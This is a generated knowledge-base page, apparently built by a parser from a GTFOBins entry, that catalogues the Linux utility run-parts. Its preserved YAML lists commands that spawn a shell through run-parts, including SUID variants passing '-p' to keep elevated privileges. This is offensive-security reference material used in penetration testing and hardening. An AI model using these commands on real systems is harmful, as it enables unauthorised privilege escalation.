---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# run-parts

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `run-parts` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/run-parts` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [run-parts](../../tools/linux/run-parts.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | run-parts |
| name | run-parts |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/run-parts/ |

## Preserved Source Material

```yaml
_body: ''
_name: run-parts
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/run-parts
functions:
  shell:
  - code: run-parts --new-session --regex '^sh$' /bin
    contexts:
      sudo: null
      suid:
        code: run-parts --new-session --regex '^sh$' /bin --arg='-p'
        shell: false
      unprivileged: null
  - code: 'cp /bin/sh /path/to/temp-dir/

      run-parts /path/to/temp-dir/'
    contexts:
      sudo: null
      suid:
        code: 'cp /bin/sh /path/to/temp-dir/

          run-parts /path/to/temp-dir/ --arg=''-p'''
        shell: false
      unprivileged: null
```
